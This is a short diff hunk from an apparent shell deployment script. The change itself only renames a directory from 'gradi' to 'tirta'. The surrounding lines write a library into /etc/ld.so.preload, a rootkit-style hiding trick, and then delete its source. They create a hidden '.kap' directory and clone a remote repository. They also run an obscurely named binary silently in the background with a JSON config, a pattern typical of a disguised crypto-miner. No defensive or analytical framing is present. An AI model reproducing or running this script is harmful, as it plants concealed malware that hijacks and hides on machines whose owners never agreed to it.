@@ -8,7 +8,7 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .kap && cd .kap
 git clone https://gitlab.com/project5295248/tirta.git
-cd gradi
+cd tirta
 chmod +x 80.json && chmod +x zepo
 ./zepo -c "80.json" > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
